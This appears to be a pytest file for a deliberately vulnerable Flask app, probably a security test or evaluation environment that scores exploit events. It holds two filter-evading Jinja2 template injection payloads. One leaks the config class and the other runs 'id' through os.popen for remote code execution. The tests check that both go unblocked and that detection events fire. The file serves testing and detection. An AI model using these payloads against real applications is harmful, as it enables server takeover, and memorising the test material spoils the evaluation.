import re
import subprocess

from conftest import _preview

INTROSPECTION_PAYLOAD = "{{ (config|attr(('_'*2)~'class'~('_'*2))) }}"
INTROSPECTION_RENDERED = "&lt;class &#39;flask.config.Config&#39;&gt;"

RCE_PAYLOAD = (
    "{{ (config"
    "|attr(('_'*2)~'class'~('_'*2))"
    "|attr(('_'*2)~'init'~('_'*2))"
    "|attr(('_'*2)~'globals'~('_'*2)))"
    "['o'~'s']"
    "['po'~'pen']('id')"
    "['re'~'ad']() }}"
)


def test_bypass_payload_not_blocked(client):
    resp = _preview(client, INTROSPECTION_PAYLOAD)
    assert resp.status_code == 200


def test_bypass_payload_leaks_real_class_repr(client):
    resp = _preview(client, INTROSPECTION_PAYLOAD)
    assert resp.get_json()["rendered"] == INTROSPECTION_RENDERED


def test_bypass_signature_fires_on_attr_usage(client, app):
    from app.db import get_db
    from app.scoring import get_fired_events

    with app.app_context():
        _preview(client, INTROSPECTION_PAYLOAD)
        assert "vuln_detect_bypass" in get_fired_events(get_db(app))


def test_introspection_confirmed_fires(client, app):
    from app.db import get_db
    from app.scoring import get_fired_events

    with app.app_context():
        _preview(client, INTROSPECTION_PAYLOAD)
        assert "exploit_introspection_confirmed" in get_fired_events(get_db(app))


def test_a_normal_merge_field_never_fires_bypass_or_exploit(client, app):
    from app.db import get_db
    from app.scoring import get_fired_events

    with app.app_context():
        _preview(client, "Hi {{contact.first_name}}")
        fired = get_fired_events(get_db(app))
        assert "vuln_detect_bypass" not in fired
        assert "exploit_introspection_confirmed" not in fired


def test_rce_payload_not_blocked(client):
    resp = _preview(client, RCE_PAYLOAD)
    assert resp.status_code == 200


def test_rce_payload_returns_real_command_output(client):
    resp = _preview(client, RCE_PAYLOAD)
    rendered = resp.get_json()["rendered"]
    assert re.match(r"uid=\d+\(", rendered)


def test_command_executed_fires(client, app):
    from app.db import get_db
    from app.scoring import get_fired_events

    with app.app_context():
        _preview(client, RCE_PAYLOAD)
        assert "exploit_command_executed" in get_fired_events(get_db(app))


def test_rce_output_matches_actual_container_uid(client):
    resp = _preview(client, RCE_PAYLOAD)
    expected = subprocess.run(["id"], capture_output=True, text=True).stdout.strip()
    assert resp.get_json()["rendered"].strip() == expected
